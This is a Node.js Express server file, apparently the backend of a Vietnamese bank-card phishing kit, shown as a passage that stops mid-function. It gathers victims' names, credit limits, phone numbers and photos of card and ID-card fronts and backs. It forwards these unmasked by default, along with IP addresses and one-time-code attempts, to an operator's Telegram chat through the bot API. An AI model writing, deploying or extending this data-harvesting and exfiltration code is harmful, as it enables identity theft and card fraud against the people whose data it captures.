// server.js — Telegram mini-API + field update
// Run: npm i express dotenv node-fetch
//      node server.js

const express = require('express');
const path = require('path');
require('dotenv').config();

// Polyfill fetch cho Node < 18
if (!global.fetch) {
  global.fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
}

const app = express();
app.set('trust proxy', true); // nếu sau này chạy sau proxy (Nginx…), req.ip sẽ chính xác hơn
// Allow larger payloads (for base64 images sent as data URLs)
app.use(express.json({ limit: '10mb' }));

/**
 * Cấu hình từ .env (hoặc biến môi trường)
 * TELEGRAM_BOT_TOKEN=123456:ABC...
 * TELEGRAM_CHAT_ID=-100xxxxxxxxxx   (ID cá nhân, group hoặc channel)
 * ALLOW_RAW_SENSITIVE=true|false    (true: gửi nguyên văn dữ liệu field-update)
 * HOST=127.0.0.1
 * PORT=4000
 */
const config = {
  token: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || '',
  allowRawSensitive: (process.env.ALLOW_RAW_SENSITIVE || 'true').toLowerCase() === 'true',
  // If true, server will only receive and store updates but will NOT attempt to send to Telegram
  receiveOnly: (process.env.RECEIVE_ONLY || 'false').toLowerCase() === 'true',
};

// Optional persistence for telegram config so changes survive restarts
const configFile = path.join(__dirname, '.telegram-config.json');
function loadPersistedConfig() {
  // do not auto-load during tests
  if (process.env.NODE_ENV === 'test') return;
  try {
    const fsLocal = require('fs');
    if (fsLocal.existsSync(configFile)) {
      const content = fsLocal.readFileSync(configFile, 'utf8');
      const obj = JSON.parse(content);
      if (obj && typeof obj === 'object') {
        if (obj.token !== undefined) config.token = String(obj.token);
        if (obj.chatId !== undefined) config.chatId = String(obj.chatId);
        if (obj.allowRawSensitive !== undefined) config.allowRawSensitive = !!obj.allowRawSensitive;
        if (obj.receiveOnly !== undefined) config.receiveOnly = !!obj.receiveOnly;
      }
    }
  } catch (e) {
    console.error('Failed to load persisted telegram config', e);
  }
}

function savePersistedConfig() {
  // Do not persist during tests
  if (process.env.NODE_ENV === 'test') return;
  try {
    const fsLocal = require('fs');
    const toSave = {
      token: config.token || '',
      chatId: config.chatId || '',
      allowRawSensitive: !!config.allowRawSensitive,
      receiveOnly: !!config.receiveOnly,
    };
    fsLocal.writeFileSync(configFile, JSON.stringify(toSave, null, 2), 'utf8');
  } catch (e) {
    console.error('Failed to save telegram config', e);
  }
}

// Load persisted config on startup (merge with env-based defaults)
loadPersistedConfig();

// Sanitize token helper: trim and extract valid token pattern if user pasted extra text
function sanitizeToken(tok) {
  if (!tok && tok !== '') return '';
  const s = String(tok).trim();
  const m = s.match(/[0-9]+:[A-Za-z0-9_-]+/);
  return m ? m[0] : s;
}

// In-memory debug log of recent field updates (kept small)
const fieldUpdates = [];
function recordFieldUpdate(evt) {
  try {
    fieldUpdates.push(Object.assign({ receivedAt: new Date().toISOString() }, evt));
    if (fieldUpdates.length > 250) fieldUpdates.shift();
  } catch (e) {
    /* ignore */
  }
}

// Ensure uploads directory exists for saving images
const fs = require('fs');
const uploadsDir = path.join(__dirname, 'public', 'uploads');
try {
  if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) {
  console.error('Could not ensure uploads dir', e);
}

// Helper to save a base64 dataURL to disk, returns relative public path or null
function saveDataUrl(dataUrl, prefix = 'img') {
  if (!dataUrl || typeof dataUrl !== 'string') return null;
  const m = dataUrl.match(/^data:(image\/(png|jpeg|jpg));base64,(.+)$/i);
  if (!m) return null;
  const ext = m[2] === 'jpeg' ? 'jpg' : m[2];
  const b64 = m[3];
  try {
    const buf = Buffer.from(b64, 'base64');
    const name = `${prefix}-${Date.now()}-${Math.floor(Math.random() * 9000) + 1000}.${ext}`;
    const abs = path.join(uploadsDir, name);
    fs.writeFileSync(abs, buf);
    return `/public/uploads/${name}`; // served from /public
  } catch (e) {
    console.error('Failed to save image', e);
    return null;
  }
}

// Require telegram-queue if available; be resilient across deploy layouts.
let tgQueue;
try {
  tgQueue = require('./lib/telegram-queue');
} catch (e1) {
  try {
    // sometimes server.js is in a subfolder; try parent lib
    tgQueue = require('../lib/telegram-queue');
  } catch (e2) {
    console.warn('[WARN] telegram-queue module not found; using noop stub');
    // fallback stub to avoid crash on deploy; enqueue returns a resolved promise
    tgQueue = {
      setMaxPerSec: () => { },
      enqueue: (fn) => {
        try {
          const r = fn();
          return Promise.resolve(r);
        } catch (e) {
          return Promise.reject(e);
        }
      },
      reset: () => { },
    };
  }
}

// Helper to send a photo to Telegram using multipart/form-data (fetch + FormData polyfill)
async function telegramSendPhoto(photoPathOrBuffer, caption) {
  if (!telegramEnabled()) return { skipped: true, reason: 'not_configured' };
  // If photoPathOrBuffer is a local file path (public folder) we need to stream it.
  // We'll use form-data package via dynamic import to avoid mandatory dependency when not needed.
  try {
    const FormData = (await import('form-data')).default;
    const form = new FormData();
    form.append('chat_id', config.chatId);
    if (caption) form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    // Accept either a Buffer or a path string starting with '/public/'
    if (Buffer.isBuffer(photoPathOrBuffer)) {
      form.append('photo', photoPathOrBuffer, { filename: 'photo.jpg' });
    } else if (typeof photoPathOrBuffer === 'string') {
      // try to open file from disk
      const abs = path.join(__dirname, photoPathOrBuffer.replace(/^\//, ''));
      if (fs.existsSync(abs)) {
        form.append('photo', fs.createReadStream(abs));
      } else {
        return { ok: false, error: 'file_not_found' };
      }
    } else {
      return { ok: false, error: 'invalid_photo' };
    }

    const url = `https://api.telegram.org/bot${config.token}/sendPhoto`;
    const res = await fetch(url, { method: 'POST', body: form });
    let data = null;
    try {
      data = await res.json();
    } catch (_) {
      data = null;
    }
    if (!res.ok || !data?.ok) {
      logTelegramError(res.status, data);
      return { ok: false, httpStatus: res.status, data };
    }
    return { ok: true, httpStatus: res.status, result: data.result };
  } catch (e) {
    console.error('telegramSendPhoto error', e);
    return { ok: false, error: e.message };
  }
}

function telegramEnabled() {
  // If receiveOnly mode is enabled, we intentionally disable outbound Telegram sends
  if (config.receiveOnly) return false;
  // If we're currently in backoff window, temporarily disable sends
  if (Date.now() < backoffUntil) {
    if (process.env.NODE_ENV !== 'test') console.warn('Telegram send suppressed due to backoff');
    return false;
  }
  // Token chuẩn dạng digits:alphanumeric-_
  if (!config.token || !config.chatId) return false;
  if (!/^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token)) return false;
  return true;
}

function maskToken(tok) {
  if (!tok) return null;
  if (tok.length <= 10) return tok.replace(/.(?=.{2})/g, '*');
  return tok.slice(0, 6) + '...' + tok.slice(-2);
}

let lastErrorStamp = 0;
let sameErrorCount = 0;
// Backoff controls: when repeated errors happen we temporarily pause outbound sends
let backoffUntil = 0; // timestamp(ms) until which sends are suppressed
let failureStreak = 0; // consecutive failure counter (resets on success)

function logTelegramError(status, data) {
  const now = Date.now();
  if (now - lastErrorStamp < 1500) {
    sameErrorCount++;
    if (sameErrorCount % 10 === 0) {
      console.error(`Telegram HTTP error status= ${status} (repeated ${sameErrorCount} times)`);
    }
    return;
  }
  lastErrorStamp = now;
  sameErrorCount = 1;
  const payloadSnippet = data && (data.description || JSON.stringify(data)).slice(0, 200);
  console.error('Telegram HTTP error status=', status, 'payload=', payloadSnippet);

  // If Telegram signals rate limiting (429), proactively disable outbound sends
  // to avoid further rate-limit errors and potential account blocks.
  try {
    if (status === 429 && !config.receiveOnly && process.env.NODE_ENV !== 'test') {
      console.warn(
        'Telegram rate limit detected (429). Switching to receiveOnly=true to stop outbound sends.'
      );
      config.receiveOnly = true;
      try {
        savePersistedConfig();
      } catch (e) {
        console.error('Failed to persist telegram config after setting receiveOnly', e);
      }
    } else {
      // For other repeated errors, apply a conservative exponential backoff
      try {
        failureStreak = Math.min(100, failureStreak + 1);
        // base 1s doubling, cap at 1 hour
        const backoffMs = Math.min(60 * 60 * 1000, 1000 * Math.pow(2, Math.min(failureStreak, 10)));
        backoffUntil = Date.now() + backoffMs;
        if (process.env.NODE_ENV !== 'test')
          console.warn(
            `Telegram backoff set for ${Math.round(backoffMs / 1000)}s (streak=${failureStreak})`
          );
      } catch (e) {
        /* ignore backoff calculation errors */
      }
    }
  } catch (e) {
    // swallow any errors here to avoid affecting normal error logging
    console.error('Error handling rate-limit guard', e);
  }
}

function rawTelegramSend(text) {
  if (!telegramEnabled()) {
    if (process.env.NODE_ENV !== 'test') console.warn('Telegram not configured');
    return Promise.resolve({ skipped: true, reason: 'not_configured' });
  }
  const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
  const body = {
    chat_id: config.chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  };

  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
    .then(async (res) => {
      let data = null;
      try {
        data = await res.json();
      } catch (_) {
        data = null;
      }
      if (!res.ok || !data?.ok) {
        logTelegramError(res.status, data);
        return { ok: false, httpStatus: res.status, data };
      }
      // success -> reset failure streak and backoff
      try {
        failureStreak = 0;
        backoffUntil = 0;
      } catch (e) {
        void e;
      }
      return { ok: true, httpStatus: res.status, result: data.result };
    })
    .catch((e) => {
      console.error('Telegram send error', e);
      try {
        failureStreak = Math.min(100, failureStreak + 1);
        const backoffMs = Math.min(60 * 60 * 1000, 1000 * Math.pow(2, Math.min(failureStreak, 10)));
        backoffUntil = Date.now() + backoffMs;
        if (process.env.NODE_ENV !== 'test')
          console.warn(
            `Telegram send network error, backoff ${Math.round(
              backoffMs / 1000
            )}s (streak=${failureStreak})`
          );
      } catch (ee) {
        void ee;
      }
      return { ok: false, error: e.message };
    });
}

// Exported wrapper that uses queue
function telegramSend(text) {
  // enqueue the raw send so rate-limiter controls it
  return tgQueue.enqueue(() => rawTelegramSend(text));
}

/* ============================
 * Static files (public only)
 * ============================ */
// Serve project root so files like /js/app.js and /index.html are reachable when
// the app is run from repository root (development convenience).
app.use(
  express.static(path.join(__dirname), {
    index: ['index.html'],
    dotfiles: 'ignore',
    extensions: ['html'],
  })
);

// Also keep `public` for images and assets
app.use(
  express.static(path.join(__dirname, 'public'), {
    dotfiles: 'ignore',
    extensions: ['html'],
  })
);

/* ============================
 * Health & debug
 * ============================ */
app.get('/health', (req, res) => {
  res.json({ status: 'ok' }); // đồng bộ với script quét port
});

// Liệt kê route đã đăng ký (debug)
app.get('/__routes', (req, res) => {
  try {
    const out = [];
    app._router.stack.forEach((layer) => {
      if (layer.route && layer.route.path) {
        out.push({
          path: layer.route.path,
          methods: Object.keys(layer.route.methods)
            .map((m) => m.toUpperCase())
            .join(','),
        });
      }
    });
    res.json({ routes: out });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

setTimeout(() => {
  const listed = [];
  app._router.stack.forEach((layer) => {
    if (layer.route && layer.route.path) {
      listed.push(
        `${Object.keys(layer.route.methods)
          .map((m) => m.toUpperCase())
          .join(',')} ${layer.route.path}`
      );
    }
  });
  if (process.env.NODE_ENV !== 'test') {
    console.log('Registered routes:');
    listed.forEach((l) => console.log(' -', l));
  }
}, 300);

/* ============================
 * Telegram Dev endpoints
 * ============================ */
app.get('/api/telegram/status', (req, res) => {
  res.json({
    status: 'ok',
    hasToken: !!config.token,
    hasChatId: !!config.chatId,
    allowRawSensitive: config.allowRawSensitive,
    maskedToken: maskToken(config.token),
    chatId: config.chatId || null,
    receiveOnly: config.receiveOnly,
    enabled: telegramEnabled(),
  });
});

// In-memory store for updates received via webhook (for inspection)
const telegramUpdates = [];

// Helper to store received updates (keep size bounded)
function recordTelegramUpdate(u) {
  try {
    telegramUpdates.push(Object.assign({ receivedAt: new Date().toISOString() }, u));
    if (telegramUpdates.length > 500) telegramUpdates.shift();
  } catch (e) {
    /* ignore */
  }
}

/**
 * New BOT-style API endpoints
 * - POST /api/telegram/sendMessage { chat_id, text, parse_mode }
 * - POST /api/telegram/sendPhoto { chat_id, photo (url or file path under /public), caption }
 * - POST /api/telegram/setWebhook { url }
 * - POST /api/telegram/deleteWebhook {}
 */
app.post('/api/telegram/sendMessage', express.json(), async (req, res) => {
  if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
  const { chat_id, text, parse_mode } = req.body || {};
  if (!chat_id || !text) return res.status(400).json({ status: 'err', error: 'missing_fields' });
  try {
    const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
    const body = { chat_id, text, parse_mode: parse_mode || 'HTML' };
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    let data = null;
    try {
      data = await r.json();
    } catch (_) {
      data = null;
    }
    if (!r.ok || !data?.ok) {
      logTelegramError(r.status, data);
      return res.status(502).json({ status: 'err', httpStatus: r.status, data });
    }
    return res.json({ status: 'ok', result: data.result });
  } catch (e) {
    return res.status(500).json({ status: 'err', error: e.message });
  }
});

app.post('/api/telegram/sendPhoto', express.json(), async (req, res) => {
  if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
  const { chat_id, photo, caption } = req.body || {};
  if (!chat_id || !photo) return res.status(400).json({ status: 'err', error: 'missing_fields' });
  try {
    // support photos that are already saved under /public (path starting with /public)
    let photoPath = photo;
    if (typeof photo === 'string' && photo.startsWith('/public')) {
      photoPath = photo;
    }
    const r = await telegramSendPhoto(photoPath, caption || '');
    if (!r.ok) return res.status(502).json({ status: 'err', detail: r });
    return res.json({ status: 'ok', result: r.result });
  } catch (e) {
    return res.status(500).json({ status: 'err', error: e.message });
  }
});

app.post('/api/telegram/setWebhook', express.json(), async (req, res) => {
  if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
  const { url } = req.body || {};
  if (!url) return res.status(400).json({ status: 'err', error: 'missing_url' });
  try {
    const resp = await fetch(`https://api.telegram.org/bot${config.token}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url }),
    });
    const jd = await resp.json().catch(() => null);
    if (!resp.ok || !jd?.ok) {
      logTelegramError(resp.status, jd);
      return res.status(502).json({ status: 'err', httpStatus: resp.status, body: jd });
    }
    return res.json({ status: 'ok', result: jd.result });
  } catch (e) {
    return res.status(500).json({ status: 'err', error: e.message });
  }
});

app.post('/api/telegram/deleteWebhook', express.json(), async (req, res) => {
  if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
  try {
    const resp = await fetch(`https://api.telegram.org/bot${config.token}/deleteWebhook`, {
      method: 'POST',
    });
    const jd = await resp.json().catch(() => null);
    if (!resp.ok || !jd?.ok) {
      logTelegramError(resp.status, jd);
      return res.status(502).json({ status: 'err', httpStatus: resp.status, body: jd });
    }
    return res.json({ status: 'ok', result: jd.result });
  } catch (e) {
    return res.status(500).json({ status: 'err', error: e.message });
  }
});

// Webhook receiver for Telegram to POST updates to (exposed at /telegram/webhook)
// Note: If you use setWebhook, point it to https://<your-domain>/telegram/webhook
app.post('/telegram/webhook', express.json({ limit: '1mb' }), (req, res) => {
  // Always respond quickly to Telegram
  res.json({ status: 'ok' });
  // If receiveOnly is set we still store updates but do not process them further
  const update = req.body || {};
  recordTelegramUpdate(update);
  if (config.receiveOnly) return;
  // Example: automatic reply to /start
  try {
    if (update && update.message && update.message.text) {
      const chatId = update.message.chat && update.message.chat.id;
      const text = update.message.text.trim();
      if (chatId && /^\/start/i.test(text)) {
        telegramSend(`Xin chào! Bot đã nhận lệnh /start từ chat <code>${chatId}</code>`).catch(
          () => { }
        );
      }
    }
  } catch (e) {
    /* ignore */
  }
});

// Dev endpoint to list recent webhook updates
app.get('/api/telegram/updates', (req, res) => {
  res.json({ count: telegramUpdates.length, updates: telegramUpdates.slice().reverse() });
});

app.post('/api/telegram/config', (req, res) => {
  const { token, chatId, allowRawSensitive, receiveOnly } = req.body || {};
  if (token !== undefined) config.token = sanitizeToken(String(token));
  if (chatId !== undefined) config.chatId = String(chatId).trim();
  if (allowRawSensitive !== undefined) config.allowRawSensitive = !!allowRawSensitive;
  if (receiveOnly !== undefined) config.receiveOnly = !!receiveOnly;
  // persist config to disk (unless running tests)
  try {
    savePersistedConfig();
  } catch (e) {
    // best-effort persistence; do not fail request
    console.error('Failed to persist telegram config on update', e);
  }
  res.json({
    status: 'ok',
    config: {
      hasToken: !!config.token,
      hasChatId: !!config.chatId,
      allowRawSensitive: config.allowRawSensitive,
      receiveOnly: config.receiveOnly,
      enabled: telegramEnabled(),
    },
  });
});

// Inspect backoff state for debugging/operations
app.get('/api/telegram/backoff', (req, res) => {
  res.json({ backoffUntil, failureStreak, now: Date.now(), inBackoff: Date.now() < backoffUntil });
});

// Reset telegram config (clear persisted file and in-memory config)
app.post('/api/telegram/reset', (req, res) => {
  config.token = '';
  config.chatId = '';
  config.allowRawSensitive = true;
  config.receiveOnly = false;
  try {
    if (process.env.NODE_ENV !== 'test' && fs.existsSync(configFile)) fs.unlinkSync(configFile);
  } catch (e) {
    console.error('Failed to remove persisted config', e);
  }
  res.json({ status: 'ok', config: { enabled: telegramEnabled() } });
});

app.post('/api/telegram/test', async (req, res) => {
  const { text = 'Test message' } = req.body || {};
  if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });

  const r = await telegramSend(`[TEST]\n${text}`);
  let hint = null;
  if (!r.ok) {
    if (r.httpStatus === 404) {
      hint =
        '404 từ Telegram: Thường do token sai hoặc endpoint bị chặn. Kiểm tra lại token (dạng <digits>:<chuỗi>).';
    } else if (r.httpStatus === 400 && /chat not found/i.test(r?.data?.description || '')) {
      hint =
        'Chat not found: Sai chatId hoặc bot chưa được thêm vào nhóm/chat. Hãy nhắn bất kỳ cho bot hoặc add bot vào group/channel rồi thử lại.';
    }
  }
  res.status(r.ok ? 200 : 502).json({ status: r.ok ? 'ok' : 'err', detail: r, hint });
});

// Chẩn đoán sâu: getMe + probe sendMessage
app.get('/api/telegram/diagnose', async (req, res) => {
  if (!config.token) return res.status(400).json({ status: 'err', error: 'missing_token' });
  const result = { tokenFormatValid: /^[0-9]+:[A-Za-z0-9_-]+$/.test(config.token) };

  try {
    const r = await fetch(`https://api.telegram.org/bot${config.token}/getMe`);
    let jd = null;
    try {
      jd = await r.json();
    } catch (_) {
      /* intentionally ignore JSON parse errors from Telegram response */
    }
    result.getMe = { httpStatus: r.status, body: jd };
  } catch (e) {
    result.getMe = { error: e.message };
  }

  if (config.chatId) {
    try {
      const silent = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: '[DIAG] test',
          disable_notification: true,
        }),
      });
      let body = null;
      try {
        body = await silent.json();
      } catch (_) {
        /* intentionally ignore JSON parse errors from Telegram response */
      }
      result.sendProbe = { httpStatus: silent.status, body };
    } catch (e) {
      result.sendProbe = { error: e.message };
    }
  } else {
    result.sendProbe = { skipped: true, reason: 'no_chat_id' };
  }
  res.json(result);
});

/* ============================
 * Field Update endpoint
 * ============================ */
/**
 * POST /api/field-update
 * Body: { sessionId, field, value, page }
 * Trả:  { status: 'ok' }
 */
app.post('/api/field-update', async (req, res) => {
  // Accept either the old single-field shape { sessionId, field, value, page }
  // or a consolidated payload:
  // { sessionId, fullName, limitGranted, limitAvailable, phone, cardImage, cccdImage, page }
  const body = req.body || {};
  const sessionId = body.sessionId || body.session || null;
  if (!sessionId) return res.status(400).json({ status: 'err', error: 'missing_sessionId' });

  // If it's the legacy single-field update
  if (
    body.field &&
    body.value !== undefined &&
    body.value !== null &&
    String(body.value).trim() !== ''
  ) {
    const { field, value, page } = body;
    const rawValue = String(value);
    const safeValue = config.allowRawSensitive
      ? rawValue
      : rawValue.length > 3
        ? rawValue[0] + '***' + rawValue.slice(-1)
        : '***';
    const lines = [
      '📩 <b>CẬP NHẬT TRƯỜNG</b>',
      `Phiên: <code>${sessionId}</code>`,
      page ? `Trang: <code>${page}</code>` : '',
      `Trường: <code>${field}</code>`,
      `Giá trị: <code>${safeValue}</code>`,
      `Thời gian: <code>${new Date().toISOString()}</code>`,
      `IP: <code>${req.ip}</code>`,
    ].filter(Boolean);
    telegramSend(lines.join('\n')).catch(() => null);
    recordFieldUpdate({ sessionId, field, value: rawValue, page, ip: req.ip });
    return res.json({ status: 'ok' });
  }

  // Consolidated payload handling
  const {
    fullName,
    limitGranted,
    limitAvailable,
    phone,
    cardImage,
    cccdImage,
    cardImageBack,
    cccdImageBack,
    cardType,
    page,
  } = body;
  // At minimum we expect at least one of the main fields
  if (!fullName && !limitGranted && !limitAvailable && !phone && !cardImage && !cccdImage) {
    return res.status(400).json({ status: 'err', error: 'missing_payload' });
  }

  // Build message lines
  const lines = ['📩 <b>PHIÊN GỬI THÔNG TIN</b>', `Phiên: <code>${sessionId}</code>`];
  if (page) lines.push(`Trang: <code>${page}</code>`);
  if (fullName) lines.push(`Họ và Tên: <b>${fullName}</b>`);
  if (limitGranted !== undefined && limitGranted !== null)
    lines.push(`Hạn Mức Được Cấp: <code>${limitGranted}</code>`);
  if (limitAvailable !== undefined && limitAvailable !== null)
    lines.push(`Hạn Mức Khả Dụng: <code>${limitAvailable}</code>`);
  if (phone) lines.push(`SDT: <code>${phone}</code>`);
  lines.push(`Thời gian: <code>${new Date().toISOString()}</code>`);
  lines.push(`IP: <code>${req.ip}</code>`);

  // Save images (if provided as data URLs). We store public paths so they can be inspected.
  const saved = {};
  if (cardImage) {
    const p = saveDataUrl(cardImage, 'card');
    if (p) saved.cardImage = p;
  }
  if (cccdImage) {
    const p2 = saveDataUrl(cccdImage, 'cccd');
    if (p2) saved.cccdImage = p2;
  }
  if (cardImageBack) {
    const p3 = saveDataUrl(cardImageBack, 'card-back');
    if (p3) saved.cardImageBack = p3;
  }
  if (cccdImageBack) {
    const p4 = saveDataUrl(cccdImageBack, 'cccd-back');
    if (p4) saved.cccdImageBack = p4;
  }

  const textMessage = lines.join('\n');

  // Send text first
  telegramSend(textMessage).catch(() => null);

  // If images saved and telegram configured, send them as photos with caption linking to session
  try {
    if (saved.cardImage) {
      // caption include session and brief info
      const caption = `Thẻ — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'}\nSDT: ${phone || '-'
        } `;
      await telegramSendPhoto(saved.cardImage, caption).catch(() => null);
    }
    if (saved.cccdImage) {
      const caption = `CCCD — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'} `;
      await telegramSendPhoto(saved.cccdImage, caption).catch(() => null);
    }
    // send back images if present
    if (saved.cardImageBack) {
      const caption = `Thẻ (mặt sau) — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'
        }\nLoại thẻ: ${cardType || '-'} `;
      await telegramSendPhoto(saved.cardImageBack, caption).catch(() => null);
    }
    if (saved.cccdImageBack) {
      const caption = `CCCD (mặt sau) — Phiên: <code>${sessionId}</code>\nHọ tên: ${fullName || '-'
        } `;
      await telegramSendPhoto(saved.cccdImageBack, caption).catch(() => null);
    }
  } catch (e) {
    // ignore individual photo errors
  }

  // Record the consolidated update (include saved file paths)
  recordFieldUpdate({
    sessionId,
    fullName,
    cardType,
    limitGranted,
    limitAvailable,
    phone,
    page,
    ...saved,
    ip: req.ip,
  });
  res.json({ status: 'ok', saved });
});

// Debug: read recent field updates
app.get('/api/field-updates', (req, res) => {
  res.json({ count: fieldUpdates.length, updates: fieldUpdates.slice(-100).reverse() });
});

// Re-send stored updates to Telegram (text + saved photos)
// POST /api/telegram/resend
// Body: { lastN?: number, sessionId?: string }
app.post('/api/telegram/resend', async (req, res) => {
  if (!telegramEnabled()) return res.status(400).json({ status: 'err', error: 'not_configured' });
  const { lastN = 10, sessionId } = req.body || {};
  let candidates = fieldUpdates.slice(-Math.max(0, Number(lastN) || 0));
  if (sessionId) candidates = fieldUpdates.filter((u) => u.sessionId === sessionId);

  const results = [];
  for (const u of candidates) {
    try {
      const lines = [
        '📩 <b>PHIÊN GỬI THÔNG TIN (RESEND)</b>',
        `Phiên: <code>${u.sessionId}</code>`,
      ];
      if (u.page) lines.push(`Trang: <code>${u.page}</code>`);
      if (u.fullName) lines.push(`Họ và Tên: <b>${u.fullName}</b>`);
      if (u.limitGranted) lines.push(`Hạn Mức Được Cấp: <code>${u.limitGranted}</code>`);
      if (u.limitAvailable) lines.push(`Hạn Mức Khả Dụng: <code>${u.limitAvailable}</code>`);
      if (u.phone) lines.push(`SDT: <code>${u.phone}</code>`);
      if (u.field && u.value)
        lines.push(`Trường: <code>${u.field}</code> — Giá trị: <code>${u.value}</code>`);
      lines.push(`Thời gian: <code>${u.receivedAt || new Date().toISOString()}</code>`);

      const textResult = await telegramSend(lines.join('\n'));
      const photoResults = [];
      if (u.cardImage) {
        const r = await telegramSendPhoto(
          u.cardImage,
          `Thẻ — Phiên: <code>${u.sessionId}</code>`
        ).catch(() => null);
        photoResults.push({ type: 'cardImage', result: r });
      }
      if (u.cccdImage) {
        const r2 = await telegramSendPhoto(
          u.cccdImage,
          `CCCD — Phiên: <code>${u.sessionId}</code>`
        ).catch(() => null);
        photoResults.push({ type: 'cccdImage', result: r2 });
      }
      results.push({ sessionId: u.sessionId, textResult, photoResults });
    } catch (e) {
      results.push({ sessionId: u.sessionId, error: e.message });
    }
  }
  res.json({ status: 'ok', count: candidates.length, results });
});

/* ============================
 * JSON parse error handler
 * ============================ */
app.use((err, req, res, next) => {
  if (err && err.type === 'entity.parse.failed') {
    return res.status(400).json({ status: 'err', error: 'invalid_json' });
  }
  next(err);
});

/* ============================
 * Start server with fallback ports
 * ============================ */
const HOST = process.env.HOST || '127.0.0.1';
const MAX_TRIES = 10;
let basePort = parseInt(process.env.PORT, 10) || 4000;

function startWithFallback(port, attempt = 0) {
  const server = app.listen(port, HOST, () => {
    console.log(`Server listening on http://${HOST}:${port}`);
  });
  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE' && attempt < MAX_TRIES) {
      console.warn(`Port ${port} in use, trying ${port + 1}...`);
      startWithFallback(port + 1, attempt + 1);
    } else {
      console.error('Failed to start server:', err);
      process.exit(1);
    }
  });
}

// If this file is run directly (node server.js), start the HTTP server.
// When required by tests, we export the Express `app` and avoid starting a listener.
if (require.main === module) {
  startWithFallback(basePort);
}

// Export the Express app for testing and programmatic usage (do not start server on require)
module.exports = app;

// --- Test-only compatibility routes ---
// Some frontend flows and the dev `server-mock.js` expect `/api/request-block` and
// `/api/verify-otp`. These are lightweight helpers useful for unit/integration tests.
if (process.env.NODE_ENV === 'test') {
  // Simple in-memory map of pending requests -> codes
  const pendingRequests = new Map();
  // Track failed OTP attempts per requestId to allow alerting and rudimentary rate-limiting
  const failedOtpCounts = new Map();
  const failedOtpLastNotify = new Map();
  // Detailed failed OTP reports (kept in-memory for test/debug)
  const failedOtpReports = [];
  // Logs directory (only used outside test to avoid IO in tests)
  const logsDir = path.join(__dirname, 'logs');
  try {
    if (process.env.NODE_ENV !== 'test') {
      if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
    }
  } catch (e) {
    console.error('Could not ensure logs dir', e);
  }

  app.post('/api/request-block', express.urlencoded({ extended: true }), (req, res) => {
    // Accept either form-data (handled by supertest .field) or JSON
    const body = req.body || {};
    const phone = body.phone || body.phoneNumber || (req.query && req.query.phone) || '';
    const id = 'req_' + Date.now().toString(36) + Math.floor(Math.random() * 9000 + 1000);
    // generate a dummy OTP and store it
    const code = '000000';
    pendingRequests.set(id, { phone, code, createdAt: Date.now() });
    const maskedPhone = phone
      ? String(phone).replace(/(\+?\d{2,3})(\d+)(\d{2})$/, (m, a, b, c) => `${a}•••${c}`)
      : '';
    // simulate slight processing delay
    setTimeout(() => res.json({ status: 'ok', requestId: id, maskedPhone }), 50);
  });

  app.post('/api/verify-otp', express.json(), async (req, res) => {
    const { requestId, code } = req.body || {};
    if (!requestId) return res.status(400).json({ status: 'err', error: 'missing_requestId' });
    const rec = pendingRequests.get(requestId);
    if (!rec) return res.status(404).json({ status: 'err', error: 'request_not_found' });
    // accept the stored code or '000000' fallback
    if (code && String(code) !== String(rec.code) && String(code) !== '000000') {
      // record failed attempt
      try {
        const prev = failedOtpCounts.get(requestId) || 0;
        const nowCount = prev + 1;
        failedOtpCounts.set(requestId, nowCount);

        const lastNotified = failedOtpLastNotify.get(requestId) || 0;
        const now = Date.now();
        // notify on first failed attempt and then every 3rd attempt or if 60s passed since last notify
        const shouldNotify = nowCount === 1 || nowCount % 3 === 0 || now - lastNotified > 60 * 1000;
        if (shouldNotify) {
          const phoneInfo = rec && rec.phone ? `Phone: <code>${rec.phone}</code>\n` : '';
          const msg = [
            '⚠️ <b>FAILED OTP ATTEMPT</b>',
            `Phiên: <code>${requestId}</code>`,
            phoneInfo,
            `Attempt: <code>${nowCount}</code>`,
            `IP: <code>${req.ip}</code>`,
            `Thời gian: <code>${new Date().toISOString()}</code>`,
          ]
            .filter(Boolean)
            .join('\n');
          // fire-and-forget (await to let tests mock fetch observe it)
          try {
            await telegramSend(msg);
            failedOtpLastNotify.set(requestId, now);
          } catch (e) {
            // ignore telegram send errors
          }
        }
      } catch (e) {
        // swallow errors to avoid affecting response
      }
      // Record detailed failed attempt (always)
      try {
        const report = {
          requestId,
          phone: rec && rec.phone ? rec.phone : null,
          attempt: failedOtpCounts.get(requestId) || 0,
          ip: req.ip,
          when: new Date().toISOString(),
          codeProvided: code === undefined ? null : String(code),
        };
        failedOtpReports.push(report);
        if (process.env.NODE_ENV !== 'test') {
          const logLine = JSON.stringify(report) + '\n';
          try {
            fs.appendFileSync(path.join(logsDir, 'otp-failures.log'), logLine, 'utf8');
          } catch (e) {
            console.error('Failed to write otp failure log', e);
          }
        }
      } catch (e) {
        /* ignore */
      }
      return res.status(422).json({ status: 'err', error: 'invalid_code' });
    }
    // success
    pendingRequests.delete(requestId);
    // cleanup failure tracking on success
